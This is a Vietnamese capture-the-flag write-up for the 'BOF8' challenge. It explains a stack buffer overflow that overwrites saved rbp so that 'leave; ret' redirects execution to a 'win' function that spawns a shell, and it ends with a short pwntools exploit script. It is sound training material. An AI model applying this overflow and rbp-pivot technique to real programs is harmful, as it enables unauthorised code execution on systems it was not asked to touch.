# BOF8
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/dbbd6cd1-c233-473b-a652-81db558998d1)
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/f101a725-61a9-4cdd-930d-0a0034560eb6)
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/7eea3e29-8e43-4e54-bdfe-75d7e507f311)
# Tự Hành:
- Bước đầu thì ta sẽ vài terminal để test thử offset và cách mà chương trình hoạt động.
- ở bài này chỉ có thể tận dụng ở hàm buy , còn hàm sell chỉ đơn giản là in ra 1 đoạn chữ nên là mình sẽ không show ra.
- Bước đầu ta tạo 40 byte để nhập thử y như hàm read yêu cầu.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/dffb4ef6-34d2-4c15-ab9f-ecc26d4f3d9c)
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/80738717-f5a5-4781-a3e2-ce427f7b0e26)
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/ea0c3f59-60b7-494c-9075-124176f7275e)
- Đề ko bắt buộc là chỉ nhập mỗi số nên là ta nhập cái gì vào đây cũng đc , như ta thấy thanh ghi`rbp` đã bị thay đổi , và bởi vì đây ko phải là 1 địa chỉ hợp lệ nên là ta cần phải overwrite save rbp để có thể chuyển hướng luồng thực thi của chương trình.
- Ta kiểm tra ra đc offset là 32 , và 8 byte tiếp theo ta sẽ gửi vào là địa chỉ của hàm `win` để có thể chuyển hướng luống thực thi của chương trình như sau.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/efc920a1-f57a-49d1-bc20-e96261b4fe4b)
- Ta chọn đại 1 địa chỉ ghi đc để có thể vừa debug vừa viết script 1 cách dễ hiểu nhất
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/896ea0a7-7642-4950-a650-a517f73ff588)
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/53503a67-c128-451c-9613-de0b15a89929)
- Chạy thử tools thì ta có thể thấy địa chỉ mà ta nhập vào đã đc đẩy lên `rbp`.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/63a3e1ff-3efc-498e-b14e-6a6e4cc16ee8)
- Và khi nhập `3` để exit thì ta có thể thấy đc rằng stack đã bị cộng thêm 8 byte do lệnh `leave` gây ra.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/34e0e11f-a754-4cd8-a6fc-0a36c5bac047)
- Với lệnh `leave` = `mov rsp , rbp ; pop rbp` cộng với lệnh `ret` nên bị trường hợp cộng thêm 8 byte.
- Vì vậy khi kiếm ra đc địa chỉ hàm `win` ta cần phải cân chỉnh sao cho chuẩn để có thể trỏ đúng vào hàm `win` .
- Ta sẽ kiếm hàm `win` như sau.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/86ec8638-9dc6-4f6f-8173-41bc47ff22a4)
- Hàm `win` đã đc gọi vào 1 hàm có 1 khoản địa chỉ là `404850` vì thế ta có thể xem đc địa chỉ hàm `win`.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/b3689ca5-735b-4d06-b2bb-e8d142df6e36)
- Kiếm ra đc địa chỉ hàm `win` thì ta chỉ việc cân chỉnh sau cho hợp lý là đc.
- Và để cho vào `0x404850` thì ta sẽ nhập vào script bắt đầu từ `0x404840` và bởi vì sau lệnh `leave` + `ret` nó sẽ cộng thêm 8 byte. Thế nên ta sẽ nhập vào `0x404848` là hợp lý nhất , để sau khi qua lệnh `leave` nó sẽ nhảy chính xác vào hàm `win`.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/773dc829-8b94-4698-9781-6ed3866bcd46)
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/d9b50ac4-573a-405a-ad33-0ad835e4295a)
- Sau khi chạy tools thì có chúng ta đã trỏ chính xác đc tới hàm `win` , thực hiện việc tạo shell và đã thành công.
![image](https://github.com/NTDtrytofullstack/BOF8/assets/130078745/c67cc953-6d8f-4969-8cd5-104cb4ceb7a5)
# Source code:
```#!/usr/bin/python3
from pwn import *
exe = ELF('./bof8', checksec=False)

p=process(exe.path)


gdb.attach(p, gdbscript = '''
b*main+118
b*buy+89
b*main+207
c

''')
input()


p.sendlineafter(b'> ', b'1')
payload = b'a'*32
payload += p64(0x0000000000404848)
p.sendafter(b'> ', payload)
p.sendlineafter(b'> ', b'3')


p.interactive()
```
